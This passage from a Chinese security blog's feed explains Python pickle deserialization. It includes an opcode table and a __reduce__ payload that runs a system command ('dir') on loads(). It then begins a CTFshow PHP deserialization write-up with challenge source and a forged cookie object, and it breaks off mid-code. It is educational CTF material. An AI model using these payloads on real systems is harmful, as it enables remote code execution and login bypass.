Pickle反序列化过程\n</code></pre>\n<pre><code>ccopy_reg \t\t\t#引入copy_reg模块\n_reconstructor \t\t#引入_reconstructor对象\np0 \t\t\t\t\t#p:将栈顶数据(copy_reg._reconstructor)存储在memo中，0是编号\n(c__main__ \t\t\t#引入__main__模块\ntest\t\t\t\t#引入test对象\np1\t\t\t\t\t#将栈顶数据(__main__.test)存储在memo中，1是编号\nc__builtin__\t\t#引入__builtin__模块\nobject\t\t\t\t#引入object对象\np2\t\t\t\t\t#将栈顶数据(__builtin__.object)存储在memo中，2是编号\nNtp3\t\t\t\t#依次从栈中弹出数据直到(，此时弹出的数据组成一个元组，最后将该元组入栈\nRp4\t\t\t\t\t#将元组和可调用对象全部弹出并执行，将结果压入栈顶，然后将栈顶数据存储在memo中\n                    #这里便完成了所有需要的模块和类对象的调用\n(dp5\t\t\t\t#在栈顶创建一个字典，将memo中的内容转换成键值对并存储在这个字典中\n                    #然后栈顶(这个字典)存储在memo中，5是编号\nS&#39;value2&#39;\t\t\t#创建字符串&#39;value2&#39;\np6\t\t\t\t\t#存储在memo中\nS&#39;b&#39;\t\t\t\t#创建字符串’b‘\np7\t\t\t\t\t#存储在memo中\nsS&#39;value1&#39;\t\t\t#s:将&#39;value2&#39;:&#39;b&#39;作为键值对添加到字典中，创建字符串&#39;value1&#39;\np8\t\t\t\t\t#存储在memo中\nS&#39;a&#39;\t\t\t\t#创建字符串&#39;a&#39;\np9\t\t\t\t\t#存储在memo中\nsb.\t\t\t\t\t#将&#39;value1&#39;:&#39;a&#39;作为键值对添加到字典中,b:调用setstate或者dic.update()更新字典内容\n                    #读取到.结束pickle序列化过程\n</code></pre>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvMi9saWJyYXJ5L2NvcHlfcmVnLmh0bWw=\">copy_reg</span> 模块，提供了在 pickle 或是 copy 特定对象时，可以运行一个指定的函数，作为对象的构造器</p>\n<h3 id=\"python3\"><a href=\"#python3\" class=\"headerlink\" title=\"python3\"></a>python3</h3><p>python运行结果与python2不同，这里只有picpletools</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220820163443278.png\" alt=\"image-20220820163443278\"></p>\n<p>0x80：机器看到这个操作符，立刻再去字符串读取一个字节，得到x04。解释为“这是一个依据4号协议序列化的字符串”，这个操作结束。<br> \\x8c：创建（引入）对象</p>\n<p>)：向栈中压入一个空数组<br>\\x81：从栈空间弹出一个类和参数，并用这个参数实例化这个弹出来的类，最终把实例化的类再次压回栈中。<br>}：压入一个空的字典<br>(：向栈中压入一个MARK标记<br>X&#x2F;V：实例化一个字符串<br>u：以键值对的形式进行数据组合（组合的数据为当前栈空间位置到上一个MARK之间的数据），并全部添加或更新到该MARK之前的一个字典中<br>b：利用填充好的字典和实例化好的对象进行属性赋值。<br>. STOP简单易懂，结束序列化。</p>\n<h2 id=\"pickle反序列化漏洞分析\"><a href=\"#pickle反序列化漏洞分析\" class=\"headerlink\" title=\"pickle反序列化漏洞分析\"></a>pickle反序列化漏洞分析</h2><p>常见python反序列化漏洞出现在__educe__()魔法函数上，这个函数与PHP中的__wakeup（）魔术方法类似，都是因为每当反序列化时自动调用</p>\n<pre><code class=\"python\">import pickle\nimport os\nimport pickletools\n\nclass test(object):\n    def __init__(self):\n        self.value1=&#39;abc1&#39;\n        self.value2=&#39;abc2&#39;\n\n    def __reduce__(self):\n        ls=&quot;dir&quot;\n        return (os.system,(ls,))\n\nuser = test()\ny = pickle.dumps(user)\ny = pickletools.optimize(y)\nprint(y)\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220820162806423.png\" alt=\"image-20220820162806423\"></p>\n<pre><code class=\"python\">import pickle\npayload=b&#39;\\x80\\x04\\x95\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x02nt\\x8c\\x06system\\x93\\x8c\\x03dir\\x85R.&#39;\npickle.loads(payload)\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220820162837675.png\" alt=\"image-20220820162837675\"></p>\n<p>这里成功执行了系统命令</p>\n<h2 id=\"opcode\"><a href=\"#opcode\" class=\"headerlink\" title=\"opcode\"></a>opcode</h2><p>如果需要一次执行多个函数，那么opcode尤为重要</p>\n<table>\n<thead>\n<tr>\n<th>opcode</th>\n<th>描述</th>\n<th>具体写法</th>\n<th>栈上的变化</th>\n<th>memo上的变化</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>c</td>\n<td>获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）</td>\n<td>c[module]\\n[instance]\\n</td>\n<td>获得的对象入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>o</td>\n<td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td>\n<td>o</td>\n<td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>i</td>\n<td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td>\n<td>i[module]\\n[callable]\\n</td>\n<td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>N</td>\n<td>实例化一个None</td>\n<td>N</td>\n<td>获得的对象入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>S</td>\n<td>实例化一个字符串对象</td>\n<td>S’xxx’\\n（也可以使用双引号、&#39;等python字符串形式）</td>\n<td>获得的对象入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>V</td>\n<td>实例化一个UNICODE字符串对象</td>\n<td>Vxxx\\n</td>\n<td>获得的对象入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>I</td>\n<td>实例化一个int对象</td>\n<td>Ixxx\\n</td>\n<td>获得的对象入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>F</td>\n<td>实例化一个float对象</td>\n<td>Fx.x\\n</td>\n<td>获得的对象入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>R</td>\n<td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td>\n<td>R</td>\n<td>函数和参数出栈，函数的返回值入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>.</td>\n<td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td>\n<td>.</td>\n<td>无</td>\n<td>无</td>\n</tr>\n<tr>\n<td>(</td>\n<td>向栈中压入一个MARK标记</td>\n<td>(</td>\n<td>MARK标记入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>t</td>\n<td>寻找栈中的上一个MARK，并组合之间的数据为元组</td>\n<td>t</td>\n<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>)</td>\n<td>向栈中直接压入一个空元组</td>\n<td>)</td>\n<td>空元组入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>l</td>\n<td>寻找栈中的上一个MARK，并组合之间的数据为列表</td>\n<td>l</td>\n<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>]</td>\n<td>向栈中直接压入一个空列表</td>\n<td>]</td>\n<td>空列表入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>d</td>\n<td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td>\n<td>d</td>\n<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>}</td>\n<td>向栈中直接压入一个空字典</td>\n<td>}</td>\n<td>空字典入栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>p</td>\n<td>将栈顶对象储存至memo_n</td>\n<td>pn\\n</td>\n<td>无</td>\n<td>对象被储存</td>\n</tr>\n<tr>\n<td>g</td>\n<td>将memo_n的对象压栈</td>\n<td>gn\\n</td>\n<td>对象被压栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>0</td>\n<td>丢弃栈顶对象</td>\n<td>0</td>\n<td>栈顶对象被丢弃</td>\n<td>无</td>\n</tr>\n<tr>\n<td>b</td>\n<td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td>\n<td>b</td>\n<td>栈上第一个元素出栈</td>\n<td>无</td>\n</tr>\n<tr>\n<td>s</td>\n<td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td>\n<td>s</td>\n<td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td>\n<td>无</td>\n</tr>\n<tr>\n<td>u</td>\n<td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td>\n<td>u</td>\n<td>MARK标记以及被组合的数据出栈，字典被更新</td>\n<td>无</td>\n</tr>\n<tr>\n<td>a</td>\n<td>将栈的第一个元素append到第二个元素(列表)中</td>\n<td>a</td>\n<td>栈顶元素出栈，第二个元素（列表）被更新</td>\n<td>无</td>\n</tr>\n<tr>\n<td>e</td>\n<td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td>\n<td>e</td>\n<td>MARK标记以及被组合的数据出栈，列表被更新</td>\n<td>无</td>\n</tr>\n</tbody></table>\n<h4 id=\"拼接opcode\"><a href=\"#拼接opcode\" class=\"headerlink\" title=\"拼接opcode\"></a>拼接opcode</h4><p>将第一个pickle流结尾表示结束的 .去掉，将第二个pickle流与第一个拼接起来即可。</p>\n",
            "tags": [
                "Python",
                "Python"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2023/03/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
            "url": "https://blog.xcu.icu/2023/03/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
            "title": "CTFshow-web入门php反序列化",
            "date_published": "2023-03-05T04:00:00.000Z",
            "content_html": "<h2 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h2>\n<p>本篇记录反序列化的学习，有关知识点可以看我的这篇文章<a href=\"https://blog.xcu.icu/2022/11/02/php%E5%BA%8F%E5%88%97%E5%8C%96/\"> php 反序列化 - Web | Clown の Blog = (xcu.icu)</a></p>\n<h2 id=\"web254\"><a class=\"anchor\" href=\"#web254\">#</a> web254</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfShowUser</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$isVip</span><span class=\"token operator\">=</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">checkVip</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">isVip</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">===</span><span class=\"token variable\">$u</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token operator\">===</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">isVip</span><span class=\"token operator\">=</span><span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">isVip</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">vipOneKeyGetFlag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">isVip</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token keyword\">global</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"your flag is \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"no vip, no flag\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ctfShowUser</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$user</span><span class=\"token operator\">-></span><span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$user</span><span class=\"token operator\">-></span><span class=\"token function\">checkVip</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>            <span class=\"token variable\">$user</span><span class=\"token operator\">-></span><span class=\"token function\">vipOneKeyGetFlag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"no vip,no flag\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>这题 emmm 感觉不想是反序列化啊，就审计一下</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">?</span>username<span class=\"token operator\">=</span>xxxxxx<span class=\"token operator\">&amp;</span>password<span class=\"token operator\">=</span>xxxxxx</pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301201449519.png\" alt=\"image-20230301201449519\" /></p>\n<p>这里简单说一下逻辑，先看下面，$username 和 $password 先接受 get 的参数，然后 if 判断差数是否存在，如果存在就实例化类 ctfshowUser，然后调用类中的 login 方法判断用户名和密码是否正确正确给 $isVip 赋值为 ture，接着调用 checkVip 函数检测上一步有没有通过（有点怪），最后调用 vipOneKeyGetFlag 函数输出 flag（因为后面的题是这个的改动，所以这个稍微写的详细一点）</p>\n<h2 id=\"web255\"><a class=\"anchor\" href=\"#web255\">#</a> web255</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfShowUser</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$isVip</span><span class=\"token operator\">=</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">checkVip</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">isVip</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">===</span><span class=\"token variable\">$u</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token operator\">===</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">vipOneKeyGetFlag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">isVip</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token keyword\">global</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"your flag is \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"no vip, no flag\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    </pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$user</span><span class=\"token operator\">-></span><span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$user</span><span class=\"token operator\">-></span><span class=\"token function\">checkVip</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            <span class=\"token variable\">$user</span><span class=\"token operator\">-></span><span class=\"token function\">vipOneKeyGetFlag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"no vip,no flag\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>这里多了一个 cookie 被反序列化很明显了，利用这个给 isvip 赋值就可以了</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfShowUser</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$isVip</span><span class=\"token operator\">=</span><span class=\"token constant boolean\">true</span><span class=\"token 